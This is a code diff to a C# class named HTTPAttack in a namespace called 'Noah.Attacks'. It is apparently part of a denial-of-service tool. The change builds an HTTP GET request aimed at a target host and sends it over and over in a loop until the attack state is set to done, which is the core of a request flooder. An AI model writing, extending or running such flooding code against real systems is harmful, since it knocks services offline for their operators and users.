@@ -12,12 +12,18 @@ namespace Noah.Attacks
     {
         public string AttackName { get; private set; }
 
+        private string message;
         private ApplicationState state;
         private string ip;
         private int port;
 
         public HTTPAttack(ApplicationState state, string host, int port = 80)
         {
+            StringBuilder sb = new StringBuilder("GET ");
+            sb.Append(host);
+            sb.AppendLine(" HTTP/1.1");
+
+            message = sb.ToString();
             this.state = state;
             ip = host;
             this.port = port;
@@ -31,7 +37,7 @@ namespace Noah.Attacks
         private void attack()
         {
             state.State = States.Attacking;
-            byte[] bytes = Encoding.ASCII.GetBytes(state.Message);
+            byte[] bytes = Encoding.ASCII.GetBytes(message);
 
             while (state.State != States.Done)
             {
